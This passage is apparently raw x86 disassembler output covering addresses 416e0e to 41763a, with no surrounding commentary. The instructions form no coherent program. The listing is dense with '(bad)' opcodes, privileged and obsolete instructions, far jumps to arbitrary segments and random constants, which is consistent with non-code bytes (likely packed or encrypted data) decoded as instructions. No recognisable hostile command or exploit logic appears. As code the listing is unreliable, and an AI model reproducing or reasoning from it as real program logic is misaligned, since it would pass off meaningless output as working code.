  416e0e:	imul   ecx,DWORD PTR [eax+0xc],0x9c1089d9
  416e15:	sbb    DWORD PTR [esi+eiz*8+0x70],0x5a
  416e1a:	adc    al,0x50
  416e1c:	mov    cl,ch
  416e1e:	(bad)  
  416e1f:	cli    
  416e20:	jp     0x416e94
  416e22:	hlt    
  416e23:	icebp  
  416e24:	and    al,BYTE PTR [esi]
  416e26:	add    eax,0x91d82f14
  416e2b:	and    bl,BYTE PTR [edx+0x1cdbacde]
  416e31:	mov    al,0x3b
  416e33:	cmp    BYTE PTR [edi-0x2a],dl
  416e36:	mov    ah,0x25
  416e38:	(bad)  [ebx-0x53]
  416e3b:	test   DWORD PTR [esp-0x6f0700ff],esp
  416e42:	frstor [edi+0x5d]
  416e45:	les    ebp,FWORD PTR [edx]
  416e47:	xchg   ebp,eax
  416e48:	dec    esp
  416e49:	jmp    FWORD PTR [edi+0x32]
  416e4c:	icebp  
  416e4d:	addr16 imul edx,edx,0xc992b02a
  416e54:	ins    DWORD PTR es:[edi],dx
  416e55:	sbb    eax,0xeaf65c93
  416e5a:	pop    edx
  416e5b:	add    bh,BYTE PTR [esi+0x61]
  416e5e:	test   eax,0xc724c34
  416e63:	jp     0x416e2c
  416e65:	(bad)  
  416e66:	rcr    DWORD PTR ss:[edi+0x6f],1
  416e6a:	push   cs
  416e6b:	test   eax,0xb1e535e9
  416e70:	mov    bl,0xc6
  416e72:	jle    0x416e4e
  416e74:	add    al,0x3d
  416e76:	rcr    BYTE PTR [ebx],0x3
  416e79:	adc    DWORD PTR [edx],0x32eb2541
  416e7f:	sub    al,0xa2
  416e81:	not    BYTE PTR [eax+0x6a47ac58]
  416e87:	sub    eax,0x5beabdbc
  416e8c:	xchg   BYTE PTR [ecx-0x1e2f11f3],dl
  416e92:	sub    DWORD PTR [eax],esi
  416e94:	rcl    edx,cl
  416e96:	cmc    
  416e97:	inc    edi
  416e98:	retf   0xbae6
  416e9b:	jp     0x416e79
  416e9d:	int    0xb4
  416e9f:	mov    bh,0x54
  416ea1:	daa    
  416ea2:	sub    bh,bl
  416ea4:	out    dx,eax
  416ea5:	aas    
  416ea6:	sub    DWORD PTR [ebx],ebx
  416ea8:	add    al,0xb3
  416eaa:	test   DWORD PTR [ebx+0x380d1ccd],0x781bd85
  416eb4:	sbb    eax,0x856f344a
  416eb9:	push   ebp
  416eba:	mov    ebp,esi
  416ebc:	clc    
  416ebd:	scas   al,BYTE PTR es:[edi]
  416ebe:	adc    DWORD PTR [esi],esp
  416ec0:	test   esi,ecx
  416ec2:	jl     0x416e94
  416ec4:	inc    ebx
  416ec5:	jp     0x416eb1
  416ec7:	jmp    0x416f1d
  416ec9:	cmp    dh,dl
  416ecb:	jb     0x416f24
  416ecd:	mov    edx,0xf30de6b5
  416ed2:	jo     0x416ed5
  416ed4:	rol    bl,cl
  416ed6:	test   eax,0x994988a5
  416edb:	fsub   DWORD PTR [ecx]
  416edd:	push   cs
  416ede:	shl    BYTE PTR [ebp+ecx*1+0x1e18b8fd],0xcf
  416ee6:	mov    esp,0xbfe93d9f
  416eeb:	stos   BYTE PTR es:[edi],al
  416eec:	imul   edi,DWORD PTR [esi],0xe82266be
  416ef2:	ja     0x416ef8
  416ef4:	dec    edx
  416ef5:	cmp    eax,0x2b57b599
  416efa:	loope  0x416eeb
  416efc:	jmp    0x416f16
  416efe:	jmp    0x416f42
  416f00:	jg     0x416edc
  416f02:	nop
  416f03:	xchg   esi,eax
  416f04:	in     al,dx
  416f05:	mov    ds:0xcd2bd349,al
  416f0a:	popa   
  416f0b:	nop
  416f0c:	push   eax
  416f0d:	jp     0x416f87
  416f0f:	cwde   
  416f10:	jnp    0x416f3e
  416f12:	enter  0x3ed1,0x54
  416f16:	int3   
  416f17:	push   ecx
  416f18:	mov    ?,WORD PTR [eax+eax*2]
  416f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f1c:	pop    ds
  416f1d:	jge    0x416efe
  416f1f:	cmp    BYTE PTR [esi+0x37],bl
  416f22:	dec    ebp
  416f23:	gs aam 0x14
  416f26:	push   es
  416f27:	bound  ebx,QWORD PTR [ebp-0x3813f28e]
  416f2d:	dec    ecx
  416f2e:	lahf   
  416f2f:	je     0x416f5a
  416f31:	in     eax,dx
  416f32:	lea    ebx,[esi-0x7b07872a]
  416f38:	push   cs
  416f39:	sbb    bl,ch
  416f3b:	in     eax,dx
  416f3c:	gs call 0x6972:0xee9bd357
  416f44:	mov    esi,0xabec9586
  416f49:	lea    esp,[edx]
  416f4b:	sbb    al,0xa1
  416f4d:	int    0xd5
  416f4f:	daa    
  416f50:	test   eax,0x65f6ea29
  416f55:	aad    0x6b
  416f57:	fnstenv gs:[esi]
  416f5a:	add    al,0x74
  416f5c:	jecxz  0x416fda
  416f5e:	lahf   
  416f5f:	addr16 sbb eax,0x418e224f
  416f65:	mov    eax,0xb78bb1bf
  416f6a:	lds    ebp,FWORD PTR [ebp+0x30310fce]
  416f70:	adc    esp,DWORD PTR [ecx-0x4d]
  416f73:	adc    esi,DWORD PTR [edx+0x247bb439]
  416f79:	dec    ebx
  416f7a:	icebp  
  416f7b:	pop    ds
  416f7c:	retf   
  416f7d:	jp     0x416f40
  416f7f:	push   edi
  416f80:	or     eax,0xda6b0aee
  416f85:	mov    edi,0xf8548481
  416f8a:	fldenv [ebp+0x45cfed2]
  416f90:	sbb    eax,0x106eea5
  416f95:	sti    
  416f96:	sub    ecx,esp
  416f98:	push   ss
  416f99:	es cld 
  416f9b:	mov    cl,0x33
  416f9d:	lds    esp,FWORD PTR [ebx-0x368d4596]
  416fa3:	pop    edi
  416fa4:	mov    dh,0x36
  416fa6:	lods   eax,DWORD PTR ds:[esi]
  416fa7:	mov    dh,0xf8
  416fa9:	lock sbb DWORD PTR ds:[ecx+0x1a457601],0x2107c92e
  416fb5:	jecxz  0x417011
  416fb7:	cmp    ah,BYTE PTR ds:0x3a17163b
  416fbd:	das    
  416fbe:	mov    eax,edi
  416fc0:	cld    
  416fc1:	repnz mov ecx,0x12714a29
  416fc7:	sub    bh,BYTE PTR [ebp-0x4b]
  416fca:	and    dl,BYTE PTR [eax-0x5534f1d4]
  416fd0:	lock not DWORD PTR [edx]
  416fd3:	adc    eax,0xe8aefbcf
  416fd8:	in     al,dx
  416fd9:	std    
  416fda:	add    cl,BYTE PTR [edi+0x18]
  416fdd:	arpl   WORD PTR [ecx],bp
  416fdf:	or     eax,0x674adaf6
  416fe4:	and    al,0x31
  416fe6:	and    BYTE PTR [eax-0x7236f877],dl
  416fec:	lahf   
  416fed:	call   0x368e:0x148c23a4
  416ff4:	sbb    bh,BYTE PTR [edx]
  416ff6:	xchg   esp,eax
  416ff7:	ins    DWORD PTR es:[edi],dx
  416ff8:	pusha  
  416ff9:	xchg   ecx,eax
  416ffa:	test   DWORD PTR [edx-0x66409d6c],edi
  417000:	out    0x67,eax
  417002:	clc    
  417003:	mov    ah,cl
  417005:	addr16 inc ebx
  417007:	out    dx,eax
  417008:	inc    ecx
  417009:	std    
  41700a:	rcl    BYTE PTR ds:[esi-0x6baa1651],cl
  417011:	inc    edi
  417012:	jp     0x416fcf
  417014:	or     eax,0x71fedb7f
  417019:	add    eax,0xac97ef2e
  41701e:	(bad)  
  41701f:	loopne 0x416fa6
  417021:	(bad)  
  417022:	xchg   edi,eax
  417023:	leave  
  417024:	jecxz  0x417013
  417026:	cmp    DWORD PTR cs:[eax],esp
  417029:	pusha  
  41702a:	adc    ebp,DWORD PTR [ebp+ebx*4-0x2e859576]
  417031:	aad    0xbf
  417033:	xchg   esp,eax
  417034:	in     al,0x6a
  417036:	ss (bad) 
  417038:	mov    ds:0x2d447655,eax
  41703d:	xor    ch,0xf1
  417040:	sahf   
  417041:	loope  0x417084
  417043:	sub    eax,0x9ebe754
  417048:	imul   ebp,DWORD PTR [ebx+0x3d],0xffffff83
  41704c:	xchg   esp,eax
  41704d:	(bad)  
  41704e:	xchg   esp,eax
  41704f:	and    BYTE PTR [ebx],dh
  417051:	je     0x416fe1
  417053:	push   edx
  417054:	call   0xba52:0x74044dcc
  41705b:	or     ebx,eax
  41705d:	dec    edi
  41705e:	add    dh,BYTE PTR [ebp-0x4]
  417061:	daa    
  417062:	cmp    eax,0x13331bcc
  417067:	and    esi,DWORD PTR [edx+0x22]
  41706a:	fst    st(5)
  41706c:	sub    BYTE PTR [esi+0x2678cd1a],0xd5
  417073:	jmp    0x4170b0
  417075:	or     dl,0xe0
  417078:	mov    esi,0xa9ae02a1
  41707d:	stc    
  41707e:	sbb    al,BYTE PTR [ebp-0x44]
  417081:	and    BYTE PTR [ecx-0x1ba17bea],dl
  417087:	jmp    0x84ff:0xba70bf8b
  41708e:	sub    al,0x73
  417090:	adc    esi,esi
  417092:	dec    esi
  417093:	mov    bl,0x1d
  417095:	jno    0x41702a
  417097:	pop    esi
  417098:	push   ds
  417099:	fmul   QWORD PTR [eax+0x1d]
  41709c:	test   BYTE PTR [ecx+0x54],ah
  41709f:	outs   dx,DWORD PTR ds:[esi]
  4170a0:	out    dx,al
  4170a1:	stos   BYTE PTR es:[edi],al
  4170a2:	dec    esi
  4170a3:	xor    al,al
  4170a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170a6:	sbb    BYTE PTR [edx+eax*4],0xd8
  4170aa:	scas   al,BYTE PTR es:[edi]
  4170ab:	or     DWORD PTR ds:0x148a9cd6,eax
  4170b1:	pop    ebp
  4170b2:	rcl    BYTE PTR [ecx],0x6a
  4170b5:	cmovl  esp,esp
  4170b8:	fcom   st(0)
  4170ba:	push   0x3d67415d
  4170bf:	sub    eax,0x5ecb0a9a
  4170c4:	cmp    al,0x6d
  4170c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170c7:	outs   dx,BYTE PTR ds:[esi]
  4170c8:	xor    ch,bl
  4170ca:	lea    eax,[ebp+ebx*2-0x5]
  4170ce:	jmp    DWORD PTR [ecx+0x20]
  4170d1:	xor    dl,BYTE PTR [ebp+0x23c662fd]
  4170d7:	out    0xf5,eax
  4170d9:	cmp    al,0x26
  4170db:	test   edx,0x6085d578
  4170e1:	(bad)  
  4170e2:	std    
  4170e3:	rol    edi,0xe8
  4170e6:	mov    esp,0x7fe6edbc
  4170eb:	aas    
  4170ec:	repz aam 0xc6
  4170ef:	test   DWORD PTR [edx-0x680c1556],ebx
  4170f5:	sbb    BYTE PTR ds:0xc124ea67,dh
  4170fb:	jno    0x4170c6
  4170fd:	sahf   
  4170fe:	retf   0x669e
  417101:	mov    ebx,DWORD PTR [esi-0x447cd7a3]
  417107:	(bad)  [edi-0x1e2b2408]
  41710d:	lock xor al,0xca
  417110:	loope  0x417133
  417112:	sbb    BYTE PTR [edi-0x7],dl
  417115:	fwait
  417116:	sub    dh,BYTE PTR [esi]
  417118:	scas   eax,DWORD PTR es:[edi]
  417119:	nop
  41711a:	add    DWORD PTR [edi-0x6bfc98a2],ecx
  417120:	sub    BYTE PTR [esi-0x67],ah
  417123:	loope  0x4171a2
  417125:	pop    esp
  417126:	pop    esi
  417127:	out    0x70,al
  417129:	xlat   BYTE PTR ds:[ebx]
  41712a:	sbb    BYTE PTR [esi],ah
  41712c:	gs addr16 inc edx
  41712f:	mov    BYTE PTR [ebp-0x2763857f],bl
  417135:	jl     0x4171b6
  417137:	jecxz  0x4170e8
  417139:	mov    eax,0xd5e486c
  41713e:	sub    BYTE PTR [edi+0x16],0x38
  417142:	add    DWORD PTR ss:[ebx+ecx*1-0x2d],0xd92cb435
  41714b:	xchg   edi,eax
  41714c:	stos   DWORD PTR es:[edi],eax
  41714d:	cmp    al,0x40
  41714f:	inc    ebp
  417150:	data16 mov bh,0x1a
  417153:	sahf   
  417154:	xchg   edi,eax
  417155:	adc    eax,DWORD PTR [ebx]
  417157:	out    dx,eax
  417158:	adc    eax,0x55ed005f
  41715d:	adc    al,0x1f
  41715f:	xor    BYTE PTR [eax+0x2c],dl
  417162:	callw  0xf2e2
  417166:	xlat   BYTE PTR ds:[ebx]
  417167:	mov    ecx,0xe074968c
  41716c:	and    BYTE PTR [esi],al
  41716e:	addr16 sti 
  417170:	jno    0xb9ed4f6f
  417176:	cmp    ecx,edx
  417178:	addr16 mov ds:0x9cd2,al
  41717c:	cli    
  41717d:	mov    eax,ds:0xc8670c78
  417182:	fwait
  417183:	xchg   edx,eax
  417184:	xchg   BYTE PTR [edx],ch
  417186:	add    BYTE PTR [ecx+0x3a8bc5ab],al
  41718c:	popf   
  41718d:	cli    
  41718e:	test   DWORD PTR [esi+0x54],0x74e55e64
  417195:	(bad)  
  417196:	or     al,0x81
  417198:	mov    ch,BYTE PTR [eax]
  41719a:	mov    al,ds:0x142b8cb8
  41719f:	rcr    esp,cl
  4171a1:	stos   BYTE PTR es:[edi],al
  4171a2:	and    al,0xf9
  4171a4:	pop    edx
  4171a5:	cmc    
  4171a6:	jle    0x417140
  4171a8:	mov    eax,0x3374a353
  4171ad:	and    bl,BYTE PTR [ecx]
  4171af:	aaa    
  4171b0:	and    DWORD PTR [edx+0x4e03002b],ebx
  4171b6:	outs   dx,DWORD PTR ds:[esi]
  4171b7:	cmp    edi,DWORD PTR [edi]
  4171b9:	lods   eax,DWORD PTR ds:[esi]
  4171ba:	dec    ebp
  4171bb:	cld    
  4171bc:	sub    edi,DWORD PTR [ecx-0x229bd849]
  4171c2:	loop   0x4171df
  4171c4:	xchg   BYTE PTR [edi+0x48],cl
  4171c7:	cmc    
  4171c8:	enter  0x6a3d,0x7f
  4171cc:	mov    ah,BYTE PTR ds:0x263f0963
  4171d2:	imul   ebp,DWORD PTR [ebx],0xffffffac
  4171d5:	sbb    ah,BYTE PTR [edx+0x5c]
  4171d8:	out    0x58,eax
  4171da:	and    al,0xce
  4171dc:	in     al,0x1b
  4171de:	sub    eax,0x8a900b64
  4171e3:	jo     0x417261
  4171e5:	repz repnz dec edi
  4171e8:	adc    DWORD PTR [eax],ebp
  4171ea:	or     eax,0xc4baed30
  4171ef:	inc    eax
  4171f0:	mov    edi,0x17cdbd8e
  4171f5:	or     eax,0xb73102f5
  4171fa:	pop    esi
  4171fb:	out    dx,eax
  4171fc:	ds jae 0x417223
  4171ff:	add    esi,esp
  417201:	sub    BYTE PTR [edx],cl
  417203:	mov    bh,0x9f
  417205:	aad    0xbb
  417207:	dec    esp
  417208:	lea    esi,[ebp-0x4a1c2799]
  41720e:	in     eax,dx
  41720f:	rol    DWORD PTR [eax],0xae
  417212:	mov    dl,0xf7
  417214:	jne    0x41719c
  417216:	cmp    DWORD PTR [ebx-0x11],0xffffffae
  41721a:	mov    ecx,0x5844d302
  41721f:	xchg   BYTE PTR [esi+0x1804cf95],cl
  417225:	sbb    ecx,DWORD PTR [eax+0x6b34f593]
  41722b:	inc    ebx
  41722c:	shl    ch,cl
  41722e:	int3   
  41722f:	in     eax,dx
  417230:	bts    DWORD PTR [ebp-0x5c],esi
  417234:	dec    ebp
  417235:	stos   DWORD PTR es:[edi],eax
  417236:	add    DWORD PTR [eax],ebx
  417238:	int    0x62
  41723a:	dec    edi
  41723b:	xchg   esp,eax
  41723c:	test   BYTE PTR [ecx-0x4168a49a],bh
  417242:	mov    bh,0x96
  417244:	jbe    0x4172b4
  417246:	mov    ch,0x2c
  417248:	and    esi,edi
  41724a:	test   BYTE PTR [ebx+0x30],al
  41724d:	pop    esp
  41724e:	loope  0x417244
  417250:	stos   DWORD PTR es:[edi],eax
  417251:	or     DWORD PTR [edi],esi
  417253:	xor    al,dh
  417255:	jb     0x4171ec
  417257:	sub    cl,bl
  417259:	mov    ebx,0x3270eb75
  41725e:	xchg   DWORD PTR [edx-0x3e4d886a],eax
  417264:	jae    0x41724c
  417266:	fneni(8087 only) 
  417268:	add    eax,0x4b22efe1
  41726d:	imul   ecx,DWORD PTR [edi-0x68],0xffffffe3
  417271:	mov    edx,0x2055120b
  417276:	or     bl,ah
  417278:	jnp    0x417256
  41727a:	lea    edx,[ecx+0x17db9a10]
  417280:	jns    0x4172d4
  417282:	mov    al,ds:0x3b4c05ed
  417287:	stc    
  417288:	jnp    0x4172d3
  41728a:	push   ebp
  41728b:	mov    edx,DWORD PTR [esi-0x39f154c4]
  417291:	xchg   BYTE PTR [ebx*8-0x1d9d7fbf],bh
  417298:	mov    ds:0xb4dfabc5,al
  41729d:	cmp    BYTE PTR [edx+0x16e58be8],ch
  4172a3:	cs and al,0x3c
  4172a6:	jne    0x417309
  4172a8:	sti    
  4172a9:	mov    eax,ds:0xf6f9fb9d
  4172ae:	or     cl,bl
  4172b0:	je     0x417258
  4172b2:	int3   
  4172b3:	outs   dx,BYTE PTR ds:[esi]
  4172b4:	jns    0x417300
  4172b6:	mov    edx,DWORD PTR [ecx]
  4172b8:	xchg   ebp,eax
  4172b9:	inc    edi
  4172ba:	fsubr  DWORD PTR [esi-0x3c1f9093]
  4172c0:	imul   edi,DWORD PTR [edx+0x3b],0x66e7c156
  4172c7:	push   ds
  4172c8:	xor    BYTE PTR [ecx+0x79],ch
  4172cb:	jbe    0x417314
  4172cd:	mov    ebp,0xd955c379
  4172d2:	mov    al,ds:0x169c0855
  4172d7:	pop    di
  4172d9:	dec    ecx
  4172da:	mov    edi,0x3520708c
  4172df:	in     al,0x29
  4172e1:	sbb    esi,DWORD PTR ds:0x885ed0f4
  4172e7:	jnp    0x4172e4
  4172e9:	mov    ds:0x7bc602bb,eax
  4172ee:	or     al,0x84
  4172f0:	scas   al,BYTE PTR es:[edi]
  4172f1:	dec    esp
  4172f2:	cs out 0x86,al
  4172f5:	sbb    al,ah
  4172f7:	(bad)  
  4172f8:	retf   0x9d3b
  4172fb:	mov    ds:0xbe3fc6bb,al
  417300:	adc    DWORD PTR [esi+0x4a],0xbe04af6e
  417307:	pop    edi
  417308:	jne    0x417310
  41730a:	mov    eax,ds:0xbc06e79e
  41730f:	mov    ch,0xec
  417311:	into   
  417312:	jne    0x4172fc
  417314:	lahf   
  417315:	dec    ecx
  417316:	mov    dl,0x7
  417318:	or     bh,BYTE PTR [eax+edx*2+0x1]
  41731c:	int3   
  41731d:	adc    al,0x2f
  41731f:	pop    ebx
  417320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417321:	xchg   ebx,eax
  417322:	push   esp
  417323:	mov    bh,BYTE PTR [esi-0x69]
  417326:	mov    al,0x57
  417328:	push   ebp
  417329:	inc    edi
  41732a:	jmp    0x2b77bb1b
  41732f:	dec    esi
  417330:	mov    ds:0x64a93424,al
  417335:	dec    esp
  417336:	xchg   edx,eax
  417337:	out    0xce,eax
  417339:	ret    0x76d1
  41733c:	and    esi,DWORD PTR [ebx-0x16283e40]
  417342:	inc    edi
  417343:	jmp    0x41734e
  417345:	or     eax,0xfa89b84d
  41734a:	and    ch,BYTE PTR [edi+esi*1]
  41734d:	pop    esi
  41734e:	xor    bl,0xa0
  417351:	ret    
  417352:	das    
  417353:	cmp    BYTE PTR [edx+0x75c10e26],dh
  417359:	mov    WORD PTR [eax-0x5a8090e1],es
  41735f:	add    DWORD PTR [ecx+0x68],0xdd3f7495
  417366:	adc    eax,0xa7827bec
  41736b:	iret   
  41736c:	cmp    bl,cl
  41736e:	les    edi,FWORD PTR [ecx-0x7934149d]
  417374:	mov    esi,0x3b85891a
  417379:	push   edx
  41737a:	sti    
  41737b:	push   ebx
  41737c:	test   BYTE PTR [esi+0x1f],0xdf
  417380:	shld   DWORD PTR [edx+0x417e2b4d],ebp,cl
  417387:	loope  0x4173b4
  417389:	ds mov edi,esp
  41738c:	js     0x417327
  41738e:	push   es
  41738f:	(bad)  ss:[edx+ebp*2+0x2c2b4559]
  417397:	ret    
  417398:	lods   al,BYTE PTR ds:[esi]
  417399:	cli    
  41739a:	je     0x417387
  41739c:	xlat   BYTE PTR ds:[ebx]
  41739d:	push   ebp
  41739e:	retf   
  41739f:	idiv   dl
  4173a1:	mov    cl,BYTE PTR [ecx+0x67950ae5]
  4173a7:	iret   
  4173a8:	aad    0xd3
  4173aa:	xchg   edx,eax
  4173ab:	loop   0x417421
  4173ad:	and    DWORD PTR [ecx-0x7d],esp
  4173b0:	cld    
  4173b1:	fimul  WORD PTR [edi+0x32de507f]
  4173b7:	push   di
  4173b9:	xor    eax,0x75122853
  4173be:	fld    DWORD PTR [ebx+0x6]
  4173c1:	aaa    
  4173c2:	pushf  
  4173c3:	call   0xe813:0x1f24e43b
  4173ca:	jb     0x417447
  4173cc:	clc    
  4173cd:	pop    esp
  4173ce:	pop    es
  4173cf:	dec    ecx
  4173d0:	ret    
  4173d1:	aad    0xce
  4173d3:	pusha  
  4173d4:	inc    ebx
  4173d5:	outs   dx,DWORD PTR es:[esi]
  4173d7:	repz jmp 0xf5b30ee8
  4173dd:	jns    0x4173f9
  4173df:	xchg   ebp,eax
  4173e0:	ss stc 
  4173e2:	pop    edx
  4173e3:	push   es
  4173e4:	(bad)  
  4173e5:	and    esp,eax
  4173e7:	xor    edi,DWORD PTR [edi+0xd]
  4173ea:	or     ch,BYTE PTR [ebx]
  4173ec:	push   es
  4173ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173ee:	int    0xd7
  4173f0:	outs   dx,DWORD PTR ds:[esi]
  4173f1:	(bad)  
  4173f2:	dec    edi
  4173f3:	(bad)  
  4173f4:	stc    
  4173f5:	sbb    bh,BYTE PTR [ebp+ebp*8+0x1a363346]
  4173fc:	aad    0xd1
  4173fe:	jns    0x417412
  417400:	test   DWORD PTR [ebx],edx
  417402:	les    esp,FWORD PTR [ecx-0x6ec4eda1]
  417408:	sar    DWORD PTR [eax+0x71],0x2d
  41740c:	mov    DWORD PTR [esi-0x27b5bcf3],0xd6cbe623
  417416:	sar    DWORD PTR es:[ebp-0x61],1
  41741a:	js     0x4173d1
  41741c:	xchg   esp,eax
  41741d:	add    dh,ch
  41741f:	addr16 repz jmp 0x1da5f5d
  417426:	or     al,0x7
  417428:	jns    0x417432
  41742a:	jg     0x41740a
  41742c:	stos   DWORD PTR es:[edi],eax
  41742d:	xlat   BYTE PTR ds:[ebx]
  41742e:	sub    BYTE PTR [edi+0x1a8e5030],al
  417434:	not    BYTE PTR [eax+0xe]
  417437:	mov    eax,ds:0xa611c6a8
  41743c:	imul   eax,DWORD PTR [esi],0x40
  41743f:	leave  
  417440:	add    bl,0x82
  417443:	aam    0x34
  417445:	cmp    dh,bl
  417447:	(bad)  
  417448:	jne    0x4174b2
  41744a:	push   ecx
  41744b:	jbe    0x4173de
  41744d:	sub    DWORD PTR [ecx+0x4124d979],edi
  417453:	push   ss
  417454:	fidivr DWORD PTR [ecx-0x6fe2756a]
  41745a:	mov    al,ds:0xef5de1
  41745f:	fsubr  QWORD PTR [edi]
  417461:	hlt    
  417462:	stos   DWORD PTR es:[edi],eax
  417463:	pop    ebx
  417464:	cmp    eax,DWORD PTR [esi+0x62e3cb43]
  41746a:	fisub  DWORD PTR [ecx+0x17cee4dc]
  417470:	xor    esi,eax
  417472:	jge    0x4174b0
  417474:	push   0x512b997b
  417479:	and    eax,0x9bcd910
  41747e:	pop    esp
  41747f:	outs   dx,DWORD PTR ds:[esi]
  417480:	xchg   BYTE PTR [eax],bh
  417482:	int3   
  417483:	and    ebx,DWORD PTR [ebx+ecx*8+0x1aa98dc8]
  41748a:	add    ebx,edi
  41748c:	xchg   dl,cl
  41748e:	(bad)  
  417490:	fwait
  417491:	mov    bl,0x6e
  417493:	mov    bl,0x3b
  417495:	push   edi
  417496:	fbstp  TBYTE PTR [edx*2-0x3deed7c]
  41749d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41749e:	js     0x417445
  4174a0:	ret    
  4174a1:	call   0x5d00:0x46b18104
  4174a8:	sub    DWORD PTR gs:[edi],ecx
  4174ab:	pop    ss
  4174ac:	mov    ah,0xf0
  4174ae:	call   0xb89b:0x2432c54b
  4174b5:	and    al,0xea
  4174b7:	mov    ch,BYTE PTR [edi+esi*2]
  4174ba:	cdq    
  4174bb:	sbb    esi,DWORD PTR [edx]
  4174bd:	ds lahf 
  4174bf:	fidiv  DWORD PTR [edx]
  4174c1:	div    eax
  4174c3:	xchg   ebp,eax
  4174c4:	mov    al,BYTE PTR [edx]
  4174c6:	pop    ds
  4174c7:	out    0xc2,eax
  4174c9:	test   al,0xc6
  4174cb:	sbb    bl,BYTE PTR [edx]
  4174cd:	mov    bh,0x6f
  4174cf:	and    dh,BYTE PTR [ebx+0x22]
  4174d2:	cmp    BYTE PTR [ecx],bl
  4174d4:	jo     0x417503
  4174d6:	fadd   DWORD PTR [eax+edx*4+0x7e5bbf2d]
  4174dd:	out    0xe9,eax
  4174df:	mov    eax,ds:0xe1e8411a
  4174e4:	and    ebp,ebx
  4174e6:	nop
  4174e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174e8:	push   es
  4174e9:	inc    edi
  4174ea:	cld    
  4174eb:	or     BYTE PTR [edx-0x234cd7cd],dl
  4174f1:	sub    edx,DWORD PTR [esi-0x6abdd8d4]
  4174f7:	pop    ecx
  4174f8:	out    dx,al
  4174f9:	jns    0x4174eb
  4174fb:	jle    0x4174f2
  4174fd:	inc    ebx
  4174fe:	inc    ebx
  4174ff:	lock adc ebp,edx
  417502:	js     0x4174be
  417504:	hlt    
  417505:	xchg   ebx,eax
  417506:	mov    cl,al
  417508:	call   0x280ea90e
  41750d:	xchg   DWORD PTR [eax+0x79],ebx
  417510:	add    ecx,DWORD PTR [edi+0x2b6676a4]
  417516:	ror    BYTE PTR [edi],cl
  417518:	std    
  417519:	mov    tr6,ecx
  41751c:	sub    BYTE PTR [esi+0x5a46443a],bl
  417522:	int3   
  417523:	ins    DWORD PTR es:[edi],dx
  417524:	sbb    dh,BYTE PTR [ebx]
  417526:	dec    esi
  417527:	cmc    
  417528:	sbb    DWORD PTR [esi+0x6cbcefcd],0x5f
  41752f:	add    DWORD PTR [esi],0x89c6fd40
  417535:	aas    
  417536:	iret   
  417537:	cmp    BYTE PTR [esi-0x53],dh
  41753a:	inc    esi
  41753b:	call   0xa8a2c573
  417540:	mov    ebp,fs
  417542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417543:	jp     0x417524
  417545:	xor    eax,0xfac09c7c
  41754a:	mov    edi,0x4ee1437a
  41754f:	fidivr WORD PTR [ebx+eax*1]
  417552:	rcl    DWORD PTR [ecx-0x7e],0xf6
  417556:	sub    BYTE PTR [ebp+0x2d],0xa3
  41755a:	lea    ecx,cs:[esi]
  41755d:	adc    BYTE PTR [edx-0x1cde35db],al
  417563:	les    esi,FWORD PTR [ebx+0xe]
  417566:	mov    eax,ds:0xab9146cc
  41756b:	push   edx
  41756c:	jmp    0xeb783258
  417571:	push   esp
  417572:	sbb    DWORD PTR [eax-0x7d],eax
  417575:	cmp    WORD PTR [ecx+0x6fa4eea7],bp
  41757c:	retf   0xb4a3
  41757f:	clc    
  417580:	test   ch,0x5a
  417583:	xchg   ebx,eax
  417584:	add    bh,ah
  417586:	das    
  417587:	in     al,0x67
  417589:	iret   
  41758a:	push   esp
  41758b:	add    BYTE PTR [edx+0x72],al
  41758e:	into   
  41758f:	icebp  
  417590:	retf   0xcfdb
  417593:	sub    BYTE PTR [edi],dl
  417595:	or     BYTE PTR [ecx-0x2ad00b95],cl
  41759b:	push   ss
  41759c:	call   0x3d8b:0x97925194
  4175a3:	test   DWORD PTR [eax*2-0x4b740053],ebp
  4175aa:	jmp    0x417534
  4175ac:	ds ins BYTE PTR es:[edi],dx
  4175ae:	dec    esi
  4175af:	inc    edx
  4175b0:	jb     0x41762a
  4175b2:	pop    ds
  4175b3:	test   esp,ecx
  4175b5:	jg     0x4175ce
  4175b7:	stos   DWORD PTR es:[edi],eax
  4175b8:	xor    DWORD PTR [edi],0xffffffbf
  4175bb:	cli    
  4175bc:	xor    al,0x48
  4175be:	cmp    DWORD PTR [ecx],ebx
  4175c0:	or     BYTE PTR ds:0xe5763a7a,al
  4175c6:	ficomp WORD PTR [edx+0x71f0bb4a]
  4175cc:	xchg   edi,eax
  4175cd:	sbb    eax,0x5835c358
  4175d2:	fild   QWORD PTR [edx-0x71]
  4175d5:	aas    
  4175d6:	ffreep st(4)
  4175d8:	pop    ecx
  4175d9:	xor    BYTE PTR [esi-0x5d963378],dh
  4175df:	bound  edi,QWORD PTR [eax+0x39667b35]
  4175e5:	repz inc ebp
  4175e7:	xor    eax,0x7f9bd440
  4175ec:	dec    edx
  4175ed:	jbe    0x4175e8
  4175ef:	(bad)  [edi+ebp*2+0x7a]
  4175f3:	cmp    ch,BYTE PTR [ebx-0x2c]
  4175f6:	xchg   BYTE PTR [edi+0x5559958e],bl
  4175fc:	push   ebx
  4175fd:	jle    0x417618
  4175ff:	and    ebx,DWORD PTR [esi-0x7685c36b]
  417605:	(bad)  
  417606:	sub    edx,DWORD PTR [ecx]
  417608:	xchg   edx,eax
  417609:	fldcw  WORD PTR [ebx+0x6e]
  41760c:	pop    eax
  41760d:	xor    cl,BYTE PTR [ebp+esi*2+0x1f]
  417611:	loop   0x417663
  417613:	shr    BYTE PTR [esi+0x70],cl
  417616:	cs aad 0xf6
  417619:	enter  0xf3a5,0xf2
  41761d:	jl     0x41763b
  41761f:	stos   DWORD PTR es:[edi],eax
  417620:	mov    dh,0xf6
  417622:	inc    eax
  417623:	cli    
  417624:	cli    
  417625:	cmp    al,0x2c
  417627:	adc    ecx,DWORD PTR [ebx+0x2ab7387a]
  41762d:	xchg   ebx,eax
  41762e:	ja     0x4175b6
  417630:	cmp    al,0x57
  417632:	pop    ecx
  417633:	in     eax,dx
  417634:	lods   al,BYTE PTR ds:[esi]
  417635:	jne    0x4175b9
  417637:	shl    esi,0x1
  41763a:	push   ss
